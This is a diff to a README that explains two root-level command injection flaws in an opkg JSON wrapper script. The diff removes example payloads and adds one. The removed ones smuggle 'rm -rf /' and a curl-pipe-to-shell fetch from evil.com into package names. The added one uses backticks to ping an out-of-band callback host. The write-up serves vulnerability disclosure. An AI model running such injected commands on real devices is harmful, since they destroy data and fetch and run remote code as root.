@@ -1,7 +1,5 @@
 Here is a short, clear **README.md** that explains the two main security problems in this shell script:
 
-# opkg-json-wrapper.sh – Serious Security Issues
-
 This script is meant to provide a JSON interface to common `opkg` operations.
 
 **It contains two critical vulnerabilities** that allow **arbitrary command execution** as root.
@@ -44,13 +42,7 @@ Package names (`$@`) are **not escaped / quoted** when passed to `opkg`.
 
 ```bash
 # Simple injection
-./opkg-json-wrapper.sh install 'x; id > /tmp/hacked'
-
-# More dangerous (assuming opkg supports --force-* flags)
-./opkg-json-wrapper.sh install 'x --force-removal-of-dependent-packages ; rm -rf / --no-preserve-root'
-
-# Or (more realistic real-world style)
-./opkg-json-wrapper.sh install 'luci-app-foo; curl -sSf http://evil.com/payload.sh | sh'
+./opkg-json-wrapper.sh install `ping -a burp-collaborator-subdomain`
 ```
 
 Because the script usually runs as **root** (typical for opkg wrappers in embedded systems), this gives **full root shell / file destruction**.
